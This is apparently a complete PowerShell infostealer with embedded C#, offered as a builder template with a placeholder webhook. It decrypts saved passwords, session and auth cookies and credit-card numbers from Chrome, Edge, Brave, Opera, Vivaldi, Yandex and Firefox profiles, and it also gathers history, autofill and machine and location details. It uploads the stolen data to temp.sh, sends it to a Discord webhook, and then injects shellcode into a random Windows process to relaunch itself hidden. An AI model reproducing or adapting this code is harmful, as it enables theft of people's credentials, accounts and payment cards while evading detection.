# __WEBHOOK__
$wh = '__WEBHOOK__'
$tmp = $env:TEMP
$rid = [System.IO.Path]::GetRandomFileName().Replace('.','')

Add-Type @'
using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Linq;
public class Inj {
  [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a,bool b,uint c);
  [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
  [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[]d,uint s,out uint w);
  [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr i);
  [DllImport("kernel32")] static extern IntPtr GetModuleHandleA(string n);
  [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h,string n);
  [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);
  static string[] T={"RuntimeBroker","backgroundTaskHost","sihost","fontdrvhost","dllhost","ctfmon","WmiPrvSE","spoolsv"};
  public static bool Run(string cmd){
    long we=GetProcAddress(GetModuleHandleA("kernel32.dll"),"WinExec").ToInt64();
    if(we==0)return false;
    byte[] cb=System.Text.Encoding.Default.GetBytes(cmd+"\x00");
    byte[] sc=new byte[]{
      0x48,0x83,0xEC,0x28,0x48,0x83,0xE4,0xF0,
      0x48,0x8D,0x0D,0x13,0x00,0x00,0x00,
      0x31,0xD2,0x48,0xB8,
      (byte)(we&0xFF),(byte)((we>>8)&0xFF),(byte)((we>>16)&0xFF),(byte)((we>>24)&0xFF),
      (byte)((we>>32)&0xFF),(byte)((we>>40)&0xFF),(byte)((we>>48)&0xFF),(byte)((we>>56)&0xFF),
      0xFF,0xD0,0x48,0x83,0xC4,0x28,0xC3
    };
    byte[] pl=new byte[sc.Length+cb.Length];
    Buffer.BlockCopy(sc,0,pl,0,sc.Length);Buffer.BlockCopy(cb,0,pl,sc.Length,cb.Length);
    var rng=new Random();
    var procs=T.SelectMany(t=>Process.GetProcessesByName(t)).ToArray();
    if(procs.Length==0)procs=Process.GetProcessesByName("explorer");
    if(procs.Length==0)return false;
    var tgt=procs[rng.Next(procs.Length)];
    IntPtr h=OpenProcess(0x1F0FFF,false,(uint)tgt.Id);
    if(h==IntPtr.Zero)return false;
    IntPtr m=VirtualAllocEx(h,IntPtr.Zero,(uint)pl.Length,0x3000,0x40);
    uint wr;WriteProcessMemory(h,m,pl,(uint)pl.Length,out wr);
    CreateRemoteThread(h,IntPtr.Zero,0,m,IntPtr.Zero,0,IntPtr.Zero);
    CloseHandle(h);return true;
  }
}
'@

Add-Type @'
using System;using System.Runtime.InteropServices;
public class AesGcm {
  [DllImport("bcrypt.dll")] static extern int BCryptOpenAlgorithmProvider(out IntPtr h,string alg,string impl,uint f);
  [DllImport("bcrypt.dll")] static extern int BCryptSetProperty(IntPtr h,string prop,byte[]val,int sz,uint f);
  [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr alg,out IntPtr key,IntPtr kb,uint ks,byte[]sec,int secSz,uint f);
  [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr key,byte[]ct,int ctSz,ref AUTH_INFO ai,byte[]iv,int ivSz,byte[]pt,int ptSz,out int written,uint f);
  [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr k);
  [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr h,uint f);
  [StructLayout(LayoutKind.Sequential)]
  struct AUTH_INFO {
    public int cbSize;public int dwInfoVersion;
    public IntPtr pbNonce;public int cbNonce;
    public IntPtr pbAuthData;public int cbAuthData;
    public IntPtr pbTag;public int cbTag;
    public IntPtr pbMacContext;public int cbMacContext;
    public int cbAAD;public long cbData;public uint dwFlags;
  }
  public static byte[] Decrypt(byte[] key,byte[] nonce,byte[] ct,byte[] tag){
    IntPtr hAlg,hKey;
    BCryptOpenAlgorithmProvider(out hAlg,"AES",null,0);
    byte[] mode=System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
    BCryptSetProperty(hAlg,"ChainingMode",mode,mode.Length,0);
    BCryptGenerateSymmetricKey(hAlg,out hKey,IntPtr.Zero,0,key,key.Length,0);
    var tagH=GCHandle.Alloc(tag,GCHandleType.Pinned);
    var nonceH=GCHandle.Alloc(nonce,GCHandleType.Pinned);
    var ai=new AUTH_INFO{cbSize=Marshal.SizeOf(typeof(AUTH_INFO)),dwInfoVersion=1,
      pbNonce=nonceH.AddrOfPinnedObject(),cbNonce=nonce.Length,
      pbTag=tagH.AddrOfPinnedObject(),cbTag=tag.Length};
    byte[] pt=new byte[ct.Length];int written;
    BCryptDecrypt(hKey,ct,ct.Length,ref ai,null,0,pt,pt.Length,out written,0);
    tagH.Free();nonceH.Free();
    BCryptDestroyKey(hKey);BCryptCloseAlgorithmProvider(hAlg,0);
    return pt[0..written];
  }
}
'@

function Get-MasterKey($base){
  try{
    $ls=Get-Content "$base\Local State" -Raw|ConvertFrom-Json
    $enc=[Convert]::FromBase64String($ls.os_crypt.encrypted_key)
    $enc=$enc[5..($enc.Length-1)]
    Add-Type -A System.Security
    return [Security.Cryptography.ProtectedData]::Unprotect($enc,$null,'CurrentUser')
  }catch{return $null}
}

function Unprotect-Value($bytes,$mk){
  try{
    if(!$bytes -or $bytes.Length-eq 0){return ''}
    $sig=[Text.Encoding]::ASCII.GetString($bytes[0..2])
    if($sig-eq 'v10'-or $sig-eq 'v20'){
      if(!$mk){return '<no_key>'}
      $nonce=$bytes[3..14]
      $tag=$bytes[($bytes.Length-16)..($bytes.Length-1)]
      $ct=$bytes[15..($bytes.Length-17)]
      return [Text.Encoding]::UTF8.GetString([AesGcm]::Decrypt($mk,$nonce,$ct,$tag))
    }
    Add-Type -A System.Security
    return [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($bytes,$null,'CurrentUser'))
  }catch{return '<err>'}
}

function Read-Sqlite($db,$query){
  $t="$tmp\cdb_$rid`_$([System.IO.Path]::GetRandomFileName().Replace('.',''))`.db"
  try{Copy-Item $db $t -Force -EA Stop}catch{return @()}
  try{
    $py=@('python3','python')|%{
      try{$r=&$_ -c "import sqlite3,json,sys;conn=sqlite3.connect(sys.argv[1]);conn.row_factory=sqlite3.Row;print(json.dumps([dict(r) for r in conn.execute(sys.argv[2])],default=str))" $t $query 2>$null;[System.Convert]::ToString($r)}catch{''}
    }|?{$_}|Select-Object -First 1
    if($py){return $py|ConvertFrom-Json}
    $sq="$tmp\sq3_$rid.exe"
    if(!(Test-Path $sq)){
      $z="$tmp\sq3.zip"
      [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
      (New-Object Net.WebClient).DownloadFile('https://www.sqlite.org/2024/sqlite-tools-win-x64-3460100.zip',$z)
      Add-Type -A System.IO.Compression.FileSystem
      [IO.Compression.ZipFile]::ExtractToDirectory($z,"$tmp\sq3d")
      Get-ChildItem "$tmp\sq3d" -Filter sqlite3.exe -R|Select-Object -First 1|Copy-Item -Dest $sq
    }
    $r=&$sq -json $t $query 2>$null
    return ($r-join'')|ConvertFrom-Json
  }catch{return @()}
  finally{Remove-Item $t -EA SilentlyContinue}
}

$browsers=@(
  @{n='Chrome';  b="$env:LOCALAPPDATA\Google\Chrome\User Data"},
  @{n='Edge';    b="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
  @{n='Brave';   b="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"},
  @{n='Opera';   b="$env:APPDATA\Opera Software\Opera Stable"},
  @{n='OperaGX'; b="$env:APPDATA\Opera Software\Opera GX Stable"},
  @{n='Vivaldi'; b="$env:LOCALAPPDATA\Vivaldi\User Data"},
  @{n='Yandex';  b="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
)

function Get-Profiles($base){
  if(!(Test-Path $base)){return @()}
  $p=Get-ChildItem $base -Directory|?{$_.Name-eq'Default'-or $_.Name-match'^Profile \d+$'}|%{$_.FullName}
  if(!$p){$p=@("$base\Default")}
  return $p
}

$passwords=@();$cookies=@();$history=@();$cards=@()

foreach($br in $browsers){
  $mk=Get-MasterKey $br.b
  foreach($prof in Get-Profiles $br.b){
    # Passwords
    $ldb="$prof\Login Data"
    if(Test-Path $ldb){
      $rows=Read-Sqlite $ldb "SELECT origin_url,username_value,hex(password_value) AS pv FROM logins WHERE username_value!=''"
      foreach($r in $rows){
        $raw=@(); for($i=0;$i -lt $r.pv.Length;$i+=2){$raw+=[byte]([Convert]::ToByte($r.pv.Substring($i,2),16))}
        $passwords+=[PSCustomObject]@{browser=$br.n;url=$r.origin_url;user=$r.username_value;pass=Unprotect-Value $raw $mk}
      }
    }
    # Cookies
    $cdb=if(Test-Path "$prof\Network\Cookies"){"$prof\Network\Cookies"}else{"$prof\Cookies"}
    if(Test-Path $cdb){
      $rows=Read-Sqlite $cdb "SELECT host_key,name,hex(encrypted_value) AS ev FROM cookies WHERE (name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%token%' OR name LIKE '%sid%') LIMIT 400"
      foreach($r in $rows){
        $raw=@(); for($i=0;$i -lt $r.ev.Length;$i+=2){$raw+=[byte]([Convert]::ToByte($r.ev.Substring($i,2),16))}
        $cookies+=[PSCustomObject]@{browser=$br.n;host=$r.host_key;name=$r.name;value=Unprotect-Value $raw $mk}
      }
    }
    # History
    $hdb="$prof\History"
    if(Test-Path $hdb){
      $rows=Read-Sqlite $hdb "SELECT url,title,visit_count,datetime((last_visit_time/1000000)-11644473600,'unixepoch','localtime') AS visited FROM urls ORDER BY last_visit_time DESC LIMIT 300"
      foreach($r in $rows){$history+=[PSCustomObject]@{browser=$br.n;url=$r.url;title=$r.title;visits=$r.visit_count;visited=$r.visited}}
    }
    # Cards
    $wdb="$prof\Web Data"
    if(Test-Path $wdb){
      try{
        $rows=Read-Sqlite $wdb "SELECT name_on_card,expiration_month,expiration_year,hex(card_number_encrypted) AS cn FROM credit_cards"
        foreach($r in $rows){
          $raw=@(); for($i=0;$i -lt $r.cn.Length;$i+=2){$raw+=[byte]([Convert]::ToByte($r.cn.Substring($i,2),16))}
          $cards+=[PSCustomObject]@{type='card';browser=$br.n;name=$r.name_on_card;exp="$($r.expiration_month)/$($r.expiration_year)";number=Unprotect-Value $raw $mk}
        }
      }catch{}
      try{
        $rows=Read-Sqlite $wdb "SELECT name,value FROM autofill WHERE value!='' LIMIT 200"
        foreach($r in $rows){$cards+=[PSCustomObject]@{type='autofill';browser=$br.n;name=$r.name;value=$r.value}}
      }catch{}
    }
  }
}

# Firefox
$ffBase="$env:APPDATA\Mozilla\Firefox\Profiles"
if(Test-Path $ffBase){
  foreach($p in Get-ChildItem $ffBase -Directory){
    $pl="$($p.FullName)\places.sqlite"
    if(Test-Path $pl){
      $rows=Read-Sqlite $pl "SELECT url,title,visit_count,datetime(last_visit_date/1000000,'unixepoch','localtime') AS visited FROM moz_places WHERE visit_count>0 ORDER BY last_visit_date DESC LIMIT 200"
      foreach($r in $rows){$history+=[PSCustomObject]@{browser='Firefox';url=$r.url;title=$r.title;visits=$r.visit_count;visited=$r.visited}}
    }
    $cl="$($p.FullName)\cookies.sqlite"
    if(Test-Path $cl){
      $rows=Read-Sqlite $cl "SELECT host,name,value FROM moz_cookies WHERE (name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%token%') LIMIT 200"
      foreach($r in $rows){$cookies+=[PSCustomObject]@{browser='Firefox';host=$r.host;name=$r.name;value=$r.value}}
    }
  }
}

# Sysinfo
$geo=try{(Invoke-RestMethod 'http://ip-api.com/json/?fields=query,country,countryCode,city,isp' -TimeoutSec 8)}catch{$null}
$flag=if($geo.countryCode){$geo.countryCode.ToUpper().ToCharArray()|%{[char](0x1F1E6+[int]$_-65)}|Join-String}else{'🌐'}
$cpu=(Get-CimInstance Win32_Processor -EA SilentlyContinue|Select-Object -First 1).Name
$ram=[math]::Round((Get-CimInstance Win32_ComputerSystem -EA SilentlyContinue).TotalPhysicalMemory/1GB)
$screen=try{Add-Type -A System.Windows.Forms;[Windows.Forms.Screen]::PrimaryScreen.Bounds|%{"$($_.Width)x$($_.Height)"}
}catch{''}

# temp.sh upload
function Upload-TempSh($name,$content){
  try{
    $bytes=[Text.Encoding]::UTF8.GetBytes($content)
    $bnd="--------Bnd$rid"
    $hd=[Text.Encoding]::ASCII.GetBytes("--$bnd`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$name`"`r`nContent-Type: text/plain`r`n`r`n")
    $tl=[Text.Encoding]::ASCII.GetBytes("`r`n--$bnd--`r`n")
    $body=New-Object byte[]($hd.Length+$bytes.Length+$tl.Length)
    [Buffer]::BlockCopy($hd,0,$body,0,$hd.Length)
    [Buffer]::BlockCopy($bytes,0,$body,$hd.Length,$bytes.Length)
    [Buffer]::BlockCopy($tl,0,$body,$hd.Length+$bytes.Length,$tl.Length)
    $wc=New-Object Net.WebClient
    $wc.Headers['Content-Type']="multipart/form-data; boundary=$bnd"
    return $wc.UploadData('https://temp.sh/upload','POST',$body)|%{[Text.Encoding]::UTF8.GetString($_)}
  }catch{return $null}
}

# Format helpers
$hn=$env:COMPUTERNAME
function Trunc($s,$n){if($s.Length-gt $n){$s.Substring(0,$n-1)+'…'}else{$s}}

$pwTxt=($passwords|%{"[Browser]  $($_.browser)`n[URL]      $($_.url)`n[User]     $($_.user)`n[Pass]     $($_.pass)`n"})-join"`n"
$ckTxt=($cookies|%{"[Browser]  $($_.browser)`n[Host]     $($_.host)`n[Name]     $($_.name)`n[Value]    $($_.value)`n"})-join"`n"
$hiTxt=($history|Sort-Object visits -Desc|%{"[$($_.visits)x] $($_.url)`n     $($_.title) ($($_.visited))`n"})-join"`n"
$cdTxt=($cards|%{if($_.type-eq'card'){"[CARD]   $($_.name) | $($_.number) | $($_.exp)"}else{"[FILL]   $($_.name) = $($_.value)"}})-join"`n"

$pwUrl=if($passwords.Count){Upload-TempSh "${hn}_passwords.txt" "=== PASSWORDS ===`n`n$pwTxt"}else{$null}
$ckUrl=if($cookies.Count){Upload-TempSh "${hn}_cookies.txt" "=== COOKIES ===`n`n$ckTxt"}else{$null}
$hiUrl=if($history.Count){Upload-TempSh "${hn}_history.txt" "=== HISTORY ===`n`n$hiTxt"}else{$null}
$cdUrl=if($cards.Count){Upload-TempSh "${hn}_cards.txt" "=== CARDS ===`n`n$cdTxt"}else{$null}

# Discord send
function Send-Embed($embeds){
  try{
    $b=[Text.Encoding]::UTF8.GetBytes((@{embeds=$embeds}|ConvertTo-Json -Depth 10 -Compress))
    $wc=New-Object Net.WebClient;$wc.Headers['Content-Type']='application/json'
    $wc.UploadData($wh,'POST',$b)|Out-Null
  }catch{}
}

$sysEmbed=@{
  title="$flag  New Retrieval — $hn"
  color=0x7c3aed
  description="> **Host**     ``$hn```n> **User**     ``$env:USERNAME```n> **OS**       ``$(([Environment]::OSVersion).VersionString)```n> **CPU**      ``$(Trunc $cpu 40)```n> **RAM**      ``$ram GB```n$(if($screen){"> **Screen**   ``$screen```n"})> **IP**       ``$($geo.query)```n> **Location** $flag $($geo.city), $($geo.country)`n> **ISP**      ``$($geo.isp)``"
  timestamp=([DateTime]::UtcNow.ToString('o'))
  footer=@{text='browser-builder · overlord'}
}
$pwEmbed=@{
  title='🔑 Passwords'
  color=0xef4444
  description=(($passwords|Select-Object -First 6|%{"``$(Trunc $_.url 40)```n$($_.user) : $(Trunc $_.pass 30)"})-join"`n`n"|%{if($_.Length-gt 2048){$_.Substring(0,2048)}else{$_}})
  fields=@(@{name='Count';value="$($passwords.Count)";inline=$true})+$(if($pwUrl){@(@{name='📁 File';value="[Download]($pwUrl)";inline=$false})}else{@()})
  footer=@{text="$($passwords.Count) credentials"}
}
$ckEmbed=@{
  title='🍪 Session Cookies'
  color=0xf97316
  description=(($cookies|Select-Object -First 5|%{"``$(Trunc $_.host 28)`` **$($_.name)**`n``$(Trunc $_.value 38)``"})-join"`n`n"|%{if($_.Length-gt 2048){$_.Substring(0,2048)}else{$_}})
  fields=@(@{name='Count';value="$($cookies.Count)";inline=$true})+$(if($ckUrl){@(@{name='📁 File';value="[Download]($ckUrl)";inline=$false})}else{@()})
  footer=@{text="$($cookies.Count) cookies"}
}
$hiEmbed=@{
  title='📜 History'
  color=0x3b82f6
  description=(($history|Sort-Object visits -Desc|Select-Object -First 8|%{"``$($_.visits)x`` $(Trunc $_.url 60)"})-join"`n"|%{if($_.Length-gt 2048){$_.Substring(0,2048)}else{$_}})
  fields=@(@{name='Total';value="$($history.Count)";inline=$true})+$(if($hiUrl){@(@{name='📁 File';value="[Download]($hiUrl)";inline=$false})}else{@()})
  footer=@{text='sorted by frequency'}
}
$cdEmbed=@{
  title='💳 Cards & Autofill'
  color=0x10b981
  description=(($cards|?{$_.type-eq'card'}|Select-Object -First 4|%{"**$($_.name)**`n``$($_.number)``  exp ``$($_.exp)``"})-join"`n`n"|%{if($_.Length-gt 2048){$_.Substring(0,2048)}else{$_}})
  fields=@(@{name='Cards';value="$(($cards|?{$_.type-eq'card'}).Count)";inline=$true},@{name='Autofill';value="$(($cards|?{$_.type-eq'autofill'}).Count)";inline=$true})+$(if($cdUrl){@(@{name='📁 File';value="[Download]($cdUrl)";inline=$false})}else{@()})
  footer=@{text='via Web Data'}
}

Send-Embed @($sysEmbed)
Start-Sleep 1
Send-Embed @($pwEmbed,$ckEmbed)
Start-Sleep 1
Send-Embed @($hiEmbed,$cdEmbed)

# Self-inject into random process
$self=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content $MyInvocation.MyCommand.Path -Raw)))
$injCmd="powershell -w h -ep b -nop -e $self"
try{[Inj]::Run($injCmd)}catch{}
